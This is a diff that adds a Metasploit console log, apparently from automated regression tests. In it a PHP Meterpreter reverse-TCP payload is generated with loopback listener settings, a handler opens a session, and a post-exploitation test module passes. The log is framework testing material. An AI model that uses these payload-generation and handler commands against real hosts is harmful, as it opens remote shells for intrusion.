@@ -1,0 +1,21 @@
+use php/meterpreter_reverse_tcp
+generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220205-1612-2y5qy2.php -f raw AutoVerifySessionTimeout=10 lport=6008 lhost=127.0.0.1
+msf6 payload(php/meterpreter_reverse_tcp) > [*] Writing 34276 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220205-1612-2y5qy2.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 7
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6008 
+[*] Meterpreter session 8 opened (127.0.0.1:6008 -> 127.0.0.1:50155 ) at 2022-02-05 20:07:35 +0000
+use test/unix
+msf6 post(test/unix) > run session=8 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: windows
+[!]  * missing Meterpreter features: stdapi_fs_chmod, stdapi_railgun_api
+[*] Running against session 8
+[*] Session type is meterpreter and platform is windows
+before running test: should list users
+[*] Testing complete in 0.0004702
+[*] Passed: 1; Failed: 0
+[*] Post module execution completed
+msf6 post(test/unix) > 
